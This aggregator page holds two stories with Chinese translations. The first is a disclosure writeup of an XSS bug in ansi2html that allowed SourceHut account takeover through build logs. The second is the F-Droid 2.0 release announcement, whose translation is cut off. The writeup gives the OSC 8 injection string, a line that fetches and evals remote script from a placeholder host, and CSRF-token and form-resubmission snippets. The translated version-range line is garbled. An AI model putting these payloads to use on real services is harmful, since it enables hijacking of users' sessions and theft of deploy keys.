trendStories.title: 通过构建日志接管 SourceHut 账户（ansi2html.py 中的 XSS 漏洞）
trendStories.originalTitle: SourceHut account takeover via build logs (XSS in ansi2html.py)
trendStories.fullContent:
Welcome to my first big impact vulnerability writeup!

I like good stories, so let me describe some background first. I recently had a ‘great’ idea (I know, I know, I should stop having these) to set up a sr.ht instance that would pay people for hosting their projects. You can find it shamelessly plugged in the timeline section, in case you want to try it or flame me for it on socials.

Anyway, the story. The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.

I tend to include the following statement in my vulnerability research submissions from this year. Make from it what you wish.

No NLP has been used in this research. The mistakes are all mine.

SourceHut is structured in several microservices, the main ones being meta.sr.ht and probably git.sr.ht or hub.sr.ht (the flagship instance hosts it at just sr.ht). And of course builds.sr.ht, the CI.

One less known is mirror.sr.ht (slowly moving to mirror.srht.network), containing prebuilt packages for various microservices.

I must say I like this approach, because it allows a very easy start on any machine matching the flagship instance distro version exactly.

If your favourite project currently recommends installation via curl|sudo bash or ‘just launch Claude in this folder’ (sic!), please consider making yourself aware of the not less valid option of distributing software to end users using actual software packages instead.1

So if you happen to use a different distro, or even a different version of Alpine, you are on your own a bit. So there is the sr.ht-apkbuilds repo, and you can ‘fork’ it to use your signing key, your Alpine version and your mirror. There is also sr.ht-pkgbuilds for Arch, but it’s effectively unmaintained at this point.2

This involves using builds.sr.ht to bootstrap the packages. I tried to look at the page source of the build log, because it kept scrolling not where I wanted, which annoyed me a bit.

That’s when I found this:

I decided to take a closer look how it’s done, and maybe fix it. Look, I like SourceHut. I can see there is quite some wasted compute and bandwidth here. I want them to get rich so that others follow suit, and there is some unnecessary waste slowing that.3

I took a look into the logic converting ANSI escape codes to HTML, and I filed an issue for it. There has been no activity in the repo for over a year at that point, so I decided to work on it, because I like receiving good patches myself, when I am not focused on a particular project. This quickly resulted in submitting a PR fixing this particular issue.

Given my Capture The Flag background, I started looking into ansi2html a bit more, in hunt for more bugs (especially that I’m about to host it myself!). Apart from parsing escape sequences for colors, it also allows for automatic links, and OSC 8 hyperlinks. Because the code is not so well-structured yet, I was able to craft a malicious input string after reading this great XSS cheatsheet (now forever in my bookmarks):

The former is worth some explanation. No idea why, but as you can check, it parses to the same DOM tree as:

So if you happen to be able to make ␛]8;;https://example.com/"/...␇ appear in the job logs —4 which you can, either without even having an account, by sending a patch to a public mailing list with continuous integration turned on, or by controlling any remote resource that happens to be printed to the log — congratulations, you have just created a build job at https://builds.sr.ht/~someone-else/job/1234567 that executes your payload in every browser that views it. You can submit the job yourself, but this requires a paid account on the flagship instance. And there are no anonymous payments currently there.

The actual payload can be downloaded from an attacker’s website, like eval(await (await fetch('https://example.com')).text()) but here’s some speculation about what it could do.

The build log page already contains the CSRF token. You can read it with document.querySelector('[name=_csrf_token]').value for example, or just use the existing form (part of the ‘Resubmit build’ button), like document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit(). Once you get an admin to view it, you can probably grant yourself admin rights. The worse impact is that you have access to all the deploy keys, and on builds.sr.ht, there are deploy keys for sr.ht itself (probably not the case with other instances).

Making this part of the payload is left as an exercise for the curious reader. I cannot stress this enough: remember to only test worms on your own infrastructure. And never on production. Even if it’s your production.

By restricting Content-Security-Policy. I’m no expert here, but removing ‘unsafe-inline’ would be a good first step (not useful advice in itself, because inline scripts are currently used even on the build log page itself, for scrolling).

By extra sanitization (SourceHut added it, but it’s overzealous - now there are no colors!).

And by restructuring the code in ansi2html into some stateful transducer automaton thing.

I immediately emailed ~sircmpwn/sr.ht-security@lists.sr.ht explaining the entire problem, complete with a fix that mitigated the worst part at least.

Drew (can I call you Drew? I guess we are all brothers in Source) ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead. Also a good choice.

Then I contacted upstream (maybe a bit too late? exact timeline below). Ansi2html is one of the projects featured in the famous and by now beaten to death comic strip by Randall Munroe.5 Placed under pycontribs org on GitHub, which ominously states:

PyContribs main purpose is to assure that different Python-related projects remain maintained.

I reached out to the two top people from last 5 or so years’ worth of contributor graph, emails from git history, in order not to make the issue public yet, although it was already made public by the SourceHut announcement.

The maintainer I believed to be the ‘main’ one (Sorin Sbarnea) has not replied to date (he might be having some kind of holiday), although the other one (Sebastian Pipping) has. And the message was a cryptic, unusual for me to receive, ‘mail me in two weeks’.

So I patiently waited two weeks, minding my another nascent business (let me try, okay?), and sent the email.

It turned out that Sebastian (can I call you Sebastian?) is a cool guy and he figured he needed me to help him because of something with ACLs on the repo. We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts, and releasing like 3 or 4 versions of ansi2html to PyPI together.

I tried to be helpful, but had some things going on with my PhD-in-spe, so some latency crept in.

Let’s start with the hot take that CVSS scoring is a fallacy: it should be separate for each product and not just one for one root cause code path.

The purpose of CVSS is after all to provide useful information to downstream users on whether to go patch it or not. Researchers have the incentive to make it as high as possible. And projects have the incentive to downplay it. They do want to fix it, but they want to avoid the paperwork involved, and the confidentiality dance of passing it all around (and I totally get it!).

The problem is, not all software is born equal, and this is especially the case with libraries like libcurl.

CVSS 4.0 is at least a bit better than CVSS 3.x. It now makes a distinction on Vulnerable System and Subsequent System. In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable, and the browser is Subsequent (which kind of makes sense, because the bug is in the service, but then it impacts the victim browser first in order to attack the web service itself again).

The vector I initially came up with has been altered by VulnCheck. Not sure why, but maybe it can be changed back? Or maybe not worth bothering. Let me know what you think. I also want to add this blog post to the CVE DB, but I might need to check how to do it.

vulnerable system (builds.sr.ht / all of sr.ht)

subsequent system (victim browser)

While the exact impact can and should be disputed by actual users (after all, SourceHut boasts working just fine without javascript), I would argue for high or critical, not just a mere medium, because if I were a blackhat, it would suffice that Drew visited an affected build log with JS turned on, and I could submit a build job in his name with access to SourceHut deploy keys. Not sure how I would turn that into money or get away with it though. Don’t do this, kids. No excitement justifies it.

ansi2html >=1.7.0, <1.9.4, builds.sr.ht >= 0.40.0, < 0.105.1

Check your raw build logs for ␛]8;;https://example.com/"/...␇ or ␛]8;;javascript:...␇. In Bash, that would probably be something along grep $'\33]8;[^\7\33]*"' for the former.

I’m not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it. I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.

Note how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump. builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.

God for keeping the blackhat temptations away. Danonek123 for keeping me company. I love you.

See, vulnerability research does not need to be a circus, or security theatre, or a lawyered-up fight against bureaucracy. But then you might not end up better off.

Excluding CTFs & invitations to minor conferences (and being allowed to do some VR as part of my internship back when at Antmicro, which I am still grateful for), I have made a metric 0.00€ (that’s $0.00 Fahrenheit) from my vulnerability research so far. If you want to support me (so that I have more time for VR), consider buying something. I like it better than donations (though they are fine too!). I’m also available for professional security consulting.

Or at least provide some optional ultra-simple configure script that allows to just run make install/ninja install so that other people can package it easily. (By the way, I still can’t get it why people use AppImage instead of just a static binary.) ↩︎

You can still probably send your patches if you want to host your sr.ht on Arch! ↩︎

Hey Drew/Conrad/Simon/(sorry if I missed someone!), when you update ansi2html in sr.ht-apkbuilds, actually when you first restart builds.sr.ht after that, please measure the bandwidth impact on builds.sr.ht. I will make sure to link it here. ↩︎

Yes, that’s an em dash. I use Polish typography here, because I have no editor to answer to. Feel free to correct me, though. You can be my drive-by editor. ↩︎

Oops, sorry, wrong link. I’m talking about https://xkcd.com/2347/ of course. ↩︎

Totally not an impulse buy. ‘To get a sense of being invested.’ I tell to myself. ↩︎
trendStories.fullTranslation:
欢迎阅读我的第一篇高危漏洞复现与分析文章！

我喜欢好故事，所以先让我讲讲背景。我最近萌生了一个“绝妙”的想法（我知道，我知道，我不该再胡思乱想了）：搭建一个 sr.ht 实例，为托管项目的人提供报酬。你可以在时间线部分找到我毫不掩饰的硬广，以防你想尝试一下或者在社交网络上对我口诛笔伐。

言归正传。第一步是克隆 sr.ht 代码仓库的一个最小子集，然后开始动手捣鼓。

在今年提交的漏洞研究中，我通常会附上下面的声明。随你怎么看：

本项研究未使用任何自然语言处理（NLP/AI）。所有错误均由本人独自承担。

SourceHut 由若干微服务构成，主要的有 meta.sr.ht，可能还有 git.sr.ht 或 hub.sr.ht（旗舰实例将其直接托管在 sr.ht）。当然，还有作为持续集成（CI）的 builds.sr.ht。

一个鲜为人知的服务是 mirror.sr.ht（正逐步迁移至 mirror.srht.network），其中包含各种微服务的预构建软件包。

我必须承认我很喜欢这种方式，因为它让任何与旗舰实例 Linux 发行版版本完全匹配的机器都能非常轻松地启动。

如果你最喜欢的项目目前建议通过 curl|sudo bash 或“直接在此文件夹中启动 Claude”（原文如此！）进行安装，请考虑了解一下使用真正的软件包向最终用户分发软件这一同样有效的替代方案。1

因此，如果你恰好使用了不同的发行版，甚至只是不同版本的 Alpine，那你就得靠自己摸索了。为此有 sr.ht-apkbuilds 仓库，你可以将其“分叉”（fork）以使用你的签名密钥、Alpine 版本和镜像源。针对 Arch 还有 sr.ht-pkgbuilds，但目前实际上已经无人维护。2

这需要利用 builds.sr.ht 来引导打包。我尝试查看构建日志的网页源代码，因为页面总是不听使唤地滚到我不想要的位置，让我有点恼火。

就在那时，我发现了这个：

我决定仔细研究一下它是怎么实现的，或许还能顺手修好它。你看，我挺喜欢 SourceHut 的。我能看出这里存在相当一部分算力和带宽的浪费。我希望他们能发财，从而带动其他人效仿，而这些不必要的浪费拖慢了这一进程。3

我查看了将 ANSI 转义序列转换为 HTML 的逻辑，并为此提交了一个 Issue。当时该仓库已经有一年多没有任何活动了，因此我决定自己动手解决，因为当我自己没专注于某个特定项目时，也喜欢收到优秀的补丁。这很快便促成了我提交修复该特定问题的 PR。

鉴于我的 CTF（网络安全夺旗赛）背景，我开始进一步研究 ansi2html，寻找更多漏洞（尤其是因为我自己马上也要部署它了！）。除了为颜色解析转义序列外，它还支持自动链接以及 OSC 8 超链接。由于代码结构尚不够严谨，在阅读了一份极佳的 XSS 速查表（现已永久躺在我的书签收藏夹里）后，我构造出了一个恶意输入字符串：

前者值得解释一下。不知道为什么，但正如你所能验证的那样，它被解析成的 DOM 树等同于：

因此，如果你能让 ␛]8;;https://example.com/"/...␇ 出现在作业日志中——4 无论是甚至不需要账户，通过向启用了持续集成的公共邮件列表发送补丁，还是通过控制任何恰好被打印到日志中的远程资源——恭喜你，你刚刚在 https://builds.sr.ht/~someone-else/job/1234567 创建了一个构建作业，它会在每一个查看该日志的浏览器中执行你的有效载荷（payload）。你也可以自己提交该作业，但在旗舰实例上这需要付费账户，而那里目前还不支持匿名支付。

实际的有效载荷可以从攻击者的网站下载，比如 eval(await (await fetch('https://example.com')).text())，但以下是关于它能做些什么的一些推测。

构建日志页面已经包含了 CSRF 令牌。例如，你可以通过 document.querySelector('[name=_csrf_token]').value 读取它，或者直接利用现有的表单（“重新提交构建”按钮的一部分），例如 document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit()。一旦诱导管理员查看该页面，你可能就能赋予自己管理员权限。更严重的影响是你可以访问所有的部署密钥，而在 builds.sr.ht 上，存在用于 sr.ht 本身的部署密钥（在其他实例上可能并非如此）。

将此作为有效载荷的一部分留给好奇的读者作为练习。我必须反复强调：请记住，只能在自己的基础设施上测试蠕虫。切勿在生产环境中测试。哪怕那是你自己的生产环境。

通过限制内容安全策略（CSP）。我不是这方面的专家，但移除 'unsafe-inline' 会是不错的第一步（这建议本身目前不太管用，因为即使在构建日志页面本身，内联脚本也被用于滚动）。

通过额外的清理过滤（SourceHut 已经加上了，但有点用力过猛——现在连颜色都没有了！）。

以及通过将 ansi2html 中的代码重构为某种有状态的转换自动机机制。

我立即给 ~sircmpwn/sr.ht-security@lists.sr.ht 发送了邮件解释了整个问题，并附带了一个至少能缓解最严重部分的修复方案。

Drew（我能叫你 Drew 吗？我想我们在开源代码的世界里都是兄弟）最终通过给 builds.sr.ht 打补丁来自动清理 ansi2html 的输出，这也算是个不错的选择。

然后我联系了上游（也许有点太晚了？具体时间线见下文）。ansi2html 是兰道尔·门罗（Randall Munroe）那幅著名的、已经被用烂了的漫画中所描绘的项目之一。5 它托管在 GitHub 上的 pycontribs 组织下，该组织带着一丝凶兆地声明道：

“PyContribs 的主要目的是确保各种 Python 相关项目能继续得到维护。”

为了暂时不公开该漏洞，我通过 git 历史中的邮箱联系了过去 5 年左右贡献者图表排名前两位的人，尽管 SourceHut 的公告其实已经将此事公之于众了。

我认为作为“主要”维护者的那位（Sorin Sbarnea）至今仍未回复（他可能在休假），不过另一位（Sebastian Pipping）回复了。而那条回复对于我来说既神秘又不同寻常：“两周后再发邮件给我”。

于是我耐心地等待了两周，忙活着我另一个刚刚起步的业务（让我试试看，行吧？），然后发出了邮件。

结果发现 Sebastian（我能叫你 Sebastian 吗？）是个很酷的家伙，由于仓库 ACL（访问控制列表）的一些问题，他觉得需要我帮他一把。最终，我们一起把处于停滞状态的 ansi2html 重新拯救了回来，更新了一些过时的脚本，并一起向 PyPI 发布了大概 3 到 4 个版本的 ansi2html。

我尽量提供帮助，但我即将攻读博士学位（准博士）有些事情要处理，所以出现了一些拖延。

先抛出一个尖锐观点：CVSS 评分纯属谬误，它应该针对每个产品分别评分，而不能仅对同一根本原因的代码执行路径给出一个笼统的分数。

归根结底，CVSS 的目的在于为下游用户提供实用信息，告知其是否应该前去修复补丁。安全研究人员有动机将评分定得尽可能高，而项目方则倾向于淡化其严重性。项目方确实想要修复它，但他们希望能避开伴随而来的繁琐文书工作，以及在各方之间周旋保密的流程（我完全能理解！）。
问题在于，并非所有软件生而平等，对于像 libcurl 这样的库来说尤其如此。
CVSS 4.0 至少比 CVSS 3.x 好了一些。它现在对“受害系统（Vulnerable System）”和“后续系统（Subsequent System）”进行了区分。在 XSS 漏洞的场景下，通常的做法是将 Web 服务视为受害系统，而将浏览器视为后续系统（这在一定程度上是讲得通的，因为漏洞存在于服务中，但随后它首先影响受害者浏览器，从而再次对 Web 服务本身发起攻击）。
我最初提出的攻击向量已被 VulnCheck 修改。不清楚为什么，但也许可以改回来？或者可能根本不值得费心。请告诉我你们的想法。我也想把这篇博文添加到 CVE 数据库中，不过我可能得先查查该怎么操作。
受害系统（builds.sr.ht / 整个 sr.ht）
后续系统（受害者浏览器）
虽然具体的影响可以且应该由实际用户来讨论（毕竟 SourceHut 以在不启用 JavaScript 的情况下完美运行为荣），但我认为应该定为“高危”或“严重”，而不仅仅是“中危”。因为如果我是一个黑帽黑客，只要 Drew 在开启 JS 的情况下访问了受影响的构建日志，我就能以他的名义提交构建作业，并获取 SourceHut 的部署密钥。不过我不确定该如何将此变现或脱罪。孩子们，千万别学这个，再刺激的冲动也不值得这么做。
ansi2html >=1.7.0, = 0.40.0, < 0.105.1
检查您的原始构建日志中是否存在 ␛]8;;https://example.com/"/...␇ 或 ␛]8;;javascript:...␇。在 Bash 中，针对前者大概可以使用类似 grep $'\33]8;[^\7\33]*"' 的命令。
我对这个时间线并不感到骄傲，但不管怎样，至少现在一切都修复了，而且没有（？）人尝试利用它的记录。我将包含官方 Arch Linux 仓库和 sr.ht Alpine Linux 仓库，因为这两个系统都曾被推荐过。
注意，即便是对 ansi2html 进行仔细审计也无法挽救 SourceHut，除非每次版本升级时都重新审计一遍。builds.sr.ht 持续处于易受攻击状态（几乎刚好）长达 4.5 年。
感谢上帝让我远离黑帽黑客的诱惑。感谢 Danonek123 陪伴着我。我爱你。
看吧，漏洞研究并不一定非得是一场闹剧、安全表演，或是与官僚作风对簿公堂的拉锯战。但那样的话，你的处境可能并不会更好。
除去 CTF 竞赛以及小型会议的邀请（以及当初在 Antmicro 实习期间被允许进行一些漏洞研究，对此我至今依然感激），到目前为止，我的漏洞研究带来的收入完全是 0.00 欧元（也就是华氏 0.00 美元）。如果你想支持我（以便我有更多时间进行漏洞研究），可以考虑购买一些东西。相比捐赠，我更喜欢这种方式（尽管捐赠也很不错！）。我也提供专业的安全咨询服务。
或者至少提供一个可选的极简 configure 脚本，以便直接运行 make install/ninja install，方便他人轻松打包。（顺便提一句，我依然无法理解为什么人们使用 AppImage 而不是静态二进制文件。） ↩︎
如果你想在 Arch 上托管你的 sr.ht，你大概仍然可以提交你的补丁！ ↩︎
嘿，Drew/Conrad/Simon/（如果漏掉了谁请见谅！），当你们在 sr.ht-apkbuilds 中更新 ansi2html 时，实际上是在更新后首次重启 builds.sr.ht 时，请测量一下对 builds.sr.ht 带宽的影响。我一定会将它链接到这里。 ↩︎
是的，那是一个破折号（em dash）。我在这里使用了波兰式排版法，因为我不需要向任何编辑负责。不过，欢迎随时纠正我。你可以充当我的顺访编辑。 ↩︎
哎呀抱歉，链接错了。我指的当然是 https://xkcd.com/2347/。 ↩︎
绝对不是一时冲动消费。“为了获得一种深度参与感。”我对自己这么说。 ↩︎

trendStories.title: 要闻：经过一年多的不懈努力，我们非常激动地宣布 F-Droid 2.0 正式发布
trendStories.fullContent:
After more than a year of hard work, we are thrilled to announce the launch of F-Droid 2.0, a complete redesign of the official F-Droid app and the largest app update in 10 years.

For more than a decade, F-Droid has helped people discover and install free and open source Android apps. F-Droid 2.0 builds on that foundation with a modern interface, better app discovery, improved search, and a simpler experience that works well, whether you’re new to F-Droid or have been using it for years.

This isn’t just a visual refresh. The user experience was redesigned to integrate smoothly with current Android patterns, like Material Design, while keeping familiar F-Droid interactions in place. Key components were reworked and rewritten using Kotlin Compose, the standard toolkit these days, creating a foundation that will help us deliver improvements more quickly in the years ahead.

We are excited to begin rolling out F-Droid 2.0 to users over the coming weeks after 14 test releases.

Helping people discover relevant free and open source software (FOSS) was one of the primary goals of F-Droid 2.0. As the F-Droid ecosystem has grown to thousands of applications, finding the right app has become increasingly challenging. The new release introduces improvements throughout the app from browsing and categories to search to make it easier to find software that matches your needs. And of course, F-Droid does this without tracking you, or trying to “engage” you to spend increasingly more time in the app.

The new Discover screen helps uncover apps you might otherwise miss. In addition to highlighting newly added and recently updated apps, it now showcases the most downloaded apps in the repository. Whether you’re new to F-Droid or looking for something different, Discover provides several ways to explore the growing ecosystem of free and open source Android applications.

First, we’ve significantly expanded the category system. Instead of relying on a small number of broad categories, F-Droid now includes many more specialized categories, helping you get closer to the kind of app you want in just a few taps, even before you start searching.

Second, to make this expanded category system easier to navigate, we’ve introduced higher-level “meta” categories in the Discover screen. These group related categories together and provide a more approachable entry point for browsing the growing F-Droid ecosystem.

Finally, categories now play a larger role throughout the app. Their names and descriptions are used to improve app discovery and help guide users toward relevant free and open source applications.

As an example of this effort, we’ve completely reworked the Games category. Rather than grouping all games together, F-Droid 2.0 now distinguishes between 17 different game genres, making it much easier to find the kinds of games you actually enjoy playing.

Search has also been significantly improved. In addition to app names, it can now search app descriptions, categories, and translated content. This makes it easier to find apps based on what they do rather than what they’re called.

We’ve also made major improvements for users searching in Chinese, Japanese, and Korean. The new search system provides much better support for CJK writing systems, helping users find relevant apps more reliably in their own language.

Search also remembers your recent queries, allowing you to quickly return to previous searches without having to type them again.

Browsing and searching are only part of the story. F-Droid 2.0 also introduces powerful filtering options that help you narrow down large lists of apps to exactly what you’re looking for.

Filters can be combined using multiple criteria, such as app category, device compatibility, or anti-features. For example, you can choose to view only Action Games that are compatible with your device and exclude apps that depend on non-free network services.

To help users discover these and other advanced capabilities, F-Droid 2.0 introduces onboarding screens throughout the app. Rather than hiding features behind complex settings, the app provides contextual guidance to help both new and experienced users get the most out of F-Droid.

For the longest time, the experience of clicking install or update was forced to be second rate by Android. Now, thanks largely to pressure from the EU’s Digital Markets Act (DMA) and anti-trust actions around the world, Android offers all app stores an option for a smoother and more automatic install and update experience than before. F-Droid 2.0 includes groundbreaking work on utilizing these new abilities. This allows F-Droid to use a unified installer for all F-Droid installs, whether built into the OS or you installed it on your device yourself. The unified installer makes use of the new pre-approval API, so that on supported devices the user can confirm right after deciding to install the app, instead of after the app was downloaded. That brings the F-Droid install experience on official Android devices much closer to what the built-in app store can provide.

A redesign of this size means making careful decisions about what belongs in the new app, what can be handled differently, and what no longer makes sense to carry forward. Some familiar features have changed, moved, or been removed as part of making F-Droid 2.0 more streamlined and easier to maintain, without sacrificing core functionality or features users rely on.

F-Droid 2.0 now fetches and installs app updates by default. If you prefer more control, no worries, your existing preferences are still respected.

Some users missed the pull-to-refresh gesture for checking all repositories for updates. In F-Droid 2.0, the pulling gesture is exclusively for scrolling. This is now possible because the app can now automatically check for updates in the background. Rather than preserving a familiar action, we focused on removing the need for it. The best refresh button is the one you never have to press.

F-Droid gives you control of what get’s downloaded when. This helps fit our diverse users around the world, who have varying requirements. Many users have cheap access to mobile data, while mobile data is prohibitively expensive for others. Some users have heightened privacy requirements, so they need to control their network traffic. While others are using limited devices which bog down when F-Droid updates in the background. The settings which control all this were reworked to make adapting F-Droid to your needs more intuitive.

Some F-Droid users operate in environments where simply having certain apps installed or even using F-Droid can attract unwanted attention. To help support these users, F-Droid has long included a set of privacy and security features designed to protect both the user and their data.

One key privacy tool is Tor, and F-Droid has long supported using Tor for all network connections, and using Tor Onion Services for repositories and mirrors. The landscape of how Tor is integrated into Android has changed quite a bit since Tor support was first integrated. Now there is TorVPN, Orbot, TorServices and more. We took this opportunity to simplify the settings and remove the auto-detection that was no longer reliable. If you enabled “Use Tor”, that will be migrated to generic Proxy Settings. Going forward, Tor VPN is the recommended approach for easy Tor support, and the Proxy Settings are still available for those who need manual control.

Another key part is the set of “panic” features, which allow users to quickly remove some specific kinds of sensitive information from their device in emergency situations. These features are still included in F-Droid 2.0 and remain an important part of supporting users with elevated security needs.

Notably, the F-Droid app hiding feature has been simplified, to give users an accurate idea of the kind of protection they can expect. F-Droid was one of the first apps that began providing app hiding features to protect user privacy, including our “panic” feature which disguised the F-Droid app as a simple calculator app. This simple feature was requested by many users, and since then Orbot, TorVPN, Signal and others have added such masking features. Over time, a standard design has emerged across widely used apps, and we have adopted this design in the new release as well. This feature is designed so that users can better understand the limits of the disguise. Instead of the mask looking and functioning as a simple calculator app, now the mask only affects the app icon, name and nothing else. This informs users that the F-Droid app will still appear in the “Apps” settings and would be detectable during forensic inspection. This change will hopefully make it easier for users to understand the limits of this feature, while still utilizing it when needed.

One feature that has not yet returned is the ability to remove and wipe apps as a response to a panic trigger app like Ripple. We recognize that some users rely on this functionality for privacy and personal safety reasons and understand it is more than a usability feature. However, it requires highly specialized work to maintain, and given the small user base, we felt it should no longer block so many other important improvements.

The app-wiping feature remains an important feature. We would especially welcome feedback from people who use it, to help us understand how and when it is used, so we can evaluate the best path forward as we continue improving F-Droid 2.0. Users who rely on the current app-wiping implementation may opt to postpone updating to F-Droid 2.0 while we evaluate bringing the feature back.

F-Droid is designed to be integrated into any version of Android or AOSP, as we can see in CalyxOS, emteriaOS, iodéOS, Lineage-for-microG and ShiftOS. Each OS can include their own repositories by default using the “additional repos” mechanism. If you use one of these OSes, these will be visible in your Repositories overview. For additional info on what changed, check out this blog post.

Also, F-Droid Privileged Extension (FPE) is not currently supported by 2.0. That means even if FPE is installed, F-Droid 2.0 won’t use it. This overhaul focused on full featured support for the Android “session” installer. That lets F-Droid run background updates on any recent Android version without requiring FPE. Like with any of the changes here, we welcome feedback.

While many of the improvements in F-Droid 2.0 are visible on the surface, some of the most important changes happened behind the scenes.

All new code in this effort uses modern Android code standards and designs. This gives us a codebase that is easier to maintain, test, and easier to extend with new features in the future.

One of the goals of the rewrite was to lower the barrier for new contributors. Android development has changed significantly over the past decade, and F-Droid 2.0 is now built using Kotlin, the language that has become the standard for modern Android development. This makes it easier for developers familiar with today’s Android ecosystem to contribute to the project.

The new user interface is built with Jetpack Compose, the standard toolkit for Android applications. Beyond simplifying development, this helped us align F-Droid more closely with Material Design, the design system used throughout Android. As a result, F-Droid feels more familiar to Android users while remaining true to its own identity and values.

Most importantly, these changes provide a foundation for the next decade of F-Droid development. By reducing maintenance burden and making contributions easier, we can spend more time improving the experience for users and less time fighting technical debt. Some new tools also depend on fixes in Android itself, one such fix was added in Android 7 forcing us to drop support for Android 6. As always, old F-Droid releases will continue to work on old Android versions.

F-Droid 2.0 is one of the largest and most ambitious projects in our history. Bringing it to life required much more than software development. It involved user research, design, testing, documentation, community feedback, quality assurance, lots of new code, a security audit and countless discussions about how F-Droid should evolve over the next decade.

This work was made possible by the support of many organizations and individuals. Torsten Grote’s development work on the new app was funded by NLnet through the Mobifree fund. The Open Technology Fund’s User Experience & Discovery Lab supported user research and design work, bringing in Ura Design to help conduct user testing, develop user stories, and refine our Human Interface Guidelines.

Additional support came from the Open Technology Fund’s Free and Open Source Software (FOSS) Sustainability Fund, NGI, Mobifree, and the Calyx Institute, whose sponsorship helps support the ongoing maintenance and long-term sustainability of the F-Droid ecosystem.

As part of this effort, the Open Technology Fund’s Security Lab in conjunction with Convocation conducted an independent security review of F-Droid 2.0. We analysed and addressed all findings relevant to the new application, helping ensure that the release meets the high security standards our users expect. We look forward to sharing the full audit report once it has been cleared for publication.

Just as importantly, F-Droid 2.0 reflects the contributions of many volunteers. Community members contributed code, testing, bug reports, design feedback, translations, documentation, UX discussions, and countless ideas throughout the redesign process. Both long-time contributors and people making their first contribution helped shape the final result.

Finally, this work would not have been possible without your support. Donations help fund many of the less visible but essential activities that grants don’t always cover, including community management, handling the issue backlog, quality assurance, release management, and project coordination. These contributions help keep F-Droid healthy long after a specific grant-funded project has ended.

F-Droid 2.0 represents a major milestone, but it is not the end of the story. Rebuilding the app has given us a stronger foundation, yet there is still plenty of work ahead.

As the rollout reaches more users, we expect to learn a great deal from real-world usage. Community feedback has shaped F-Droid 2.0 from its earliest design discussions through many alpha and RC releases, and it will continue to guide future improvements. Some ideas did not make it into the initial release, while other features are still evolving as we gather feedback and refine their design.

In the coming months, we will continue improving performance, accessibility, app discovery, and overall usability. We’ll also keep listening to users as they adapt to the new experience and help us identify opportunities for further improvement.

Like every major F-Droid release before it, version 2.0 is not a destination, it’s the beginning of the next chapter.

One area that continues to evolve is Nearby, the feature that allows users to share apps directly between devices without relying on a central server.

The broader F-Droid 2.0 redesign gave us an opportunity to rethink Nearby from the ground up. We have been working on a new implementation based on improved connection methods that should make sharing apps more reliable and easier to use.

This work is not quite ready for inclusion in the initial F-Droid 2.0 release, but development is actively underway and the foundations are already in place. If Nearby sharing is important to you, now is an excellent time to get involved. Community feedback and testing can help shape the next generation of the feature before it reaches a wider audience.

F-Droid 2.0 is the result of thousands of hours of work from developers, designers, testers, translators, donors, and community members around the world. Now that it is reaching users, we’d love your help making it even better.

If you’re receiving the update, take some time to explore the new experience and let us know what you think. Whether you’ve found a bug, have an idea for an improvement, or simply want to tell us what works well, your feedback helps guide future development.

If you’d like to get more involved, there are many ways to contribute.

You can help test upcoming features, improve translations and documentation, review issues, contribute code, or join discussions about the future of the project. New contributors are always welcome.

And if you’re able, please consider supporting F-Droid financially. Donations through Liberapay or OpenCollective help fund the ongoing work that keeps the project healthy between major releases, from infrastructure and quality assurance to community support and project coordination.

F-Droid 2.0 is a major milestone, but the work continues. Thank you for helping us build a free, open, and sustainable app ecosystem for Android.
trendStories.fullTranslation:
经过一年多的不懈努力，我们非常激动地宣布 F-Droid 2.0 正式发布。这是对官方 F-Droid 应用的一次彻底重构，也是十年来最大规模的应用更新。

十多年来，F-Droid 一直致力于帮助大家发现并安装自由及开源的 Android 应用。F-Droid 2.0 在此基础之上，带来了现代化的界面、更出色的应用发现机制、改进的搜索功能以及更简洁流畅的体验——无论您是初次接触 F-Droid 的新朋友，还是相伴多年的老用户，都能获得良好的体验。

这不仅仅是一次视觉层面的刷新。其用户体验经过了重新设计，以流畅契合 Material Design 等当今 Android 设计规范，同时保留了用户熟悉的 F-Droid 交互习惯。核心组件采用当下标准的 Kotlin Compose 工具包进行了重构与重写，为我们未来几年更迅速地推出改进奠定了坚实的基础。

在经历了 14 个测试版本的打磨后，我们很高兴将在接下来的数周内向广大用户分批推送 F-Droid 2.0。

帮助用户发现切合需求的自由及开源软件（FOSS）是 F-Droid 2.0 的核心目标之一。随着 F-Droid 生态中的应用规模增长至数千款，找到称心如意的应用变得越来越具有挑战性。新版本在浏览、分类以及搜索等全方位进行了改进，让寻找符合您需求的软件变得更加轻松。当然，F-Droid 在做到这一切的同时绝不会追踪您，也绝不会试图通过诱导手段强行增加您在应用中的停留时间。

全新的“发现”（Discover）页面能帮助您发掘那些可能会错过的优秀应用。除了突出展示新收录和最近更新的应用外，现在还会展示仓库中下载量最高的应用。无论您是初涉 F-Droid 还是想探索不一样的内容，“发现”页面都提供了多种途径，助您畅游这个不断扩大的自由及开源 Android 应用生态。

首先，我们大幅扩充了分类体系。F-Droid 不再仅依赖少数几个宽泛的大类，而是细分出了更多专业分类，让您只需轻点几下即可快速定位所需应用类型，甚至无需开始手动搜索。

其次，为了让这一扩展后的分类体系更易于浏览，我们在“发现”页面中引入了更高层级的“元分类”（meta categories）。它们将相关分类归纳在一起，为探索日渐庞大的 F-Droid 生态提供了一个更加清晰易用的切入点。

最后，分类现在在整个应用中扮演着更重要的角色。分类名称和描述被广泛用于改进应用发现流程，引导用户精准找到切合需要的自由及开源应用。

以这一改进举例，我们对“游戏”分类进行了彻底重构。F-Droid 2.0 不再将所有游戏混为一谈，而是细分出了 17 种不同的游戏流派，让您能够更加轻松地找到自己真正喜欢玩的游戏类型。

搜索功能也迎来了重大改进。除应用名称外，现在还能搜索应用描述、所属分类以及翻译后的本地化内容。这使得用户可以根据具体功能而非应用名称来查找应用。

我们还针对使用中文、日文和韩文搜索的用户进行了重大优化。新的搜索系统对中日韩（CJK）文字系统提供了更好的支持，帮助用户更稳定可靠地使用母语检索相关应用。

此外，搜索功能现在还会记录您近期的查询内容，方便您随时重访先前的搜索，无需重复输入。

浏览与搜索仅仅是体验的一部分。F-Droid 2.0 还引入了强大的筛选选项，帮助您在海量应用列表中精确筛选出所需要的内容。

